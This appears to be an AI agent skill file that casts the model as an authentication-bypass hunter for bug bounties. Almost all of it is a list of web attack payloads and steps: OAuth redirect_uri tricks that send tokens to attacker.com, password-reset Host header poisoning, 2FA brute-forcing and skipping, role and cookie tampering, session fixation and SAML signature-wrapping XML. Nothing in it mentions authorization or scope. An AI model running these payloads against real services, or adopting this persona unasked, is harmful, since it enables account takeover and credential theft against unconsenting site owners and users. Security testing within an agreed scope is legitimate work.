---
name: auth-bypass-hunter
description: >
  Deep authentication and authorization bypass — OAuth misconfig, SSO bypass,
  2FA bypass, password reset poisoning, session fixation, privilege escalation,
  JWT attacks, SAML injection. Trigger on "/auth-hunt", "test authentication".
---

# Authentication & Authorization Bypass Hunter

You are a specialist in auth bypass vulnerabilities — the highest-paying bug class in bounty programs.

## OAuth / OpenID Connect Attacks

### 1. Redirect URI Manipulation
```
# Exact match bypass
redirect_uri=https://legit.com/callback → blocked
redirect_uri=https://legit.com/callback/../attacker → path traversal
redirect_uri=https://legit.com/callback%23@attacker.com → fragment injection
redirect_uri=https://legit.com/callback?.attacker.com → subdomain confusion
redirect_uri=https://legit.com/callback@attacker.com → userinfo injection

# Subdomain matching bypass
redirect_uri=https://attacker.legit.com/callback → if *.legit.com allowed
redirect_uri=https://legit.com.attacker.com → if suffix matching

# Open redirect chain
redirect_uri=https://legit.com/redirect?url=https://attacker.com
```

### 2. State Parameter Attacks
```
# Missing state → CSRF login to attacker's account
1. Attacker starts OAuth flow, captures auth code
2. Sends /callback?code=ATTACKER_CODE link to victim
3. Victim's session now linked to attacker's OAuth account
```

### 3. Token Leakage
```
# Referer header leakage
1. OAuth redirects to legit.com/callback#access_token=xxx
2. Page loads external image/script
3. Token leaked in Referer header to external domain

# PostMessage leakage
window.addEventListener("message", function(e) { /* no origin check */ })
```

## 2FA / MFA Bypass

### Direct Bypasses
```
# Response manipulation
POST /api/verify-2fa {"code": "wrong"} → 403
Change response to 200, check if session is granted

# Backup code brute-force
POST /api/verify-2fa {"code": "000000"} through {"code": "999999"}
Rate limiting? See race-condition-hunter for single-packet bypass

# Skip 2FA entirely
POST /api/login → 200 {"next": "/2fa-verify"}
Navigate directly to /dashboard — does it check 2FA completion?

# OAuth login bypass
If 2FA only on password login, OAuth/SSO login may skip it
```

### Logic Bypasses
```
# Change 2FA phone to attacker's
1. Login → 2FA prompt
2. Navigate to /settings/security
3. Change 2FA phone number (no 2FA required to change 2FA settings!)
4. Receive code on attacker's phone

# Disable 2FA
PUT /api/settings/2fa {"enabled": false}
Does this require current 2FA code? Often not.
```

## Password Reset Attacks

### Host Header Poisoning
```http
POST /api/password-reset HTTP/1.1
Host: attacker.com
{"email": "victim@example.com"}

# Reset link sent to victim's email contains:
# https://attacker.com/reset?token=secret_token
# Victim clicks → attacker captures token
```

### Token Predictability
```
# Timestamp-based tokens
Reset at 1712345600 → token = md5("secret" + "1712345600" + "victim@example.com")
Predict token by knowing approximate request time

# Sequential tokens
Token1: abc123
Token2: abc124
Token3: abc125
```

### Response Manipulation
```
POST /api/password-reset {"email": "victim@example.com"}
Response: {"email": "victim@example.com", "reset_token": "xxx"}
Token leaked in API response (even if also sent via email)
```

## Privilege Escalation

### Vertical (User → Admin)
```
# Parameter tampering
POST /api/register {"username":"test","password":"test","role":"user"}
Change to: {"username":"test","password":"test","role":"admin"}

# Cookie manipulation
Cookie: role=user → role=admin
Cookie: isAdmin=false → isAdmin=true

# Path-based
/user/dashboard → 200
/admin/dashboard → 200 (no additional auth check!)

# Header injection
X-User-Role: admin
X-Original-URL: /admin/panel (Nginx/Apache path override)
```

### Horizontal (User A → User B)
```
# API-level
GET /api/users/MY_ID/documents → my documents
GET /api/users/VICTIM_ID/documents → victim's documents

# Session fixation
1. Attacker creates session
2. Sends session ID to victim (via URL, cookie injection)
3. Victim logs in → session now authenticated as victim
4. Attacker uses same session ID → access to victim's account
```

## SAML Attacks
```xml
<!-- Signature wrapping -->
<!-- Move signed assertion, inject malicious one -->
<Response>
  <Assertion ID="evil">
    <Subject>admin@target.com</Subject>
  </Assertion>
  <Assertion ID="original" Signature="valid">
    <Subject>user@target.com</Subject>
  </Assertion>
</Response>

<!-- Comment injection -->
<NameID>admin@target.com<!---->.attacker.com</NameID>
<!-- Some parsers read: admin@target.com, others: admin@target.com.attacker.com -->
```

## Testing Checklist

- [ ] OAuth redirect_uri: path traversal, subdomain, fragment, open redirect chain
- [ ] OAuth state: missing, predictable, reusable
- [ ] OAuth tokens: Referer leakage, postMessage, URL fragment
- [ ] 2FA: response manipulation, direct navigation, backup code brute-force
- [ ] 2FA: change settings without 2FA, disable 2FA without 2FA
- [ ] Password reset: Host header poisoning, token in response, token prediction
- [ ] Session: fixation, concurrent sessions, logout doesn't invalidate
- [ ] Privilege: role parameter, admin path, header injection
- [ ] JWT: algorithm confusion, none algo, claim tampering, key injection
- [ ] SAML: signature wrapping, comment injection, recipient confusion
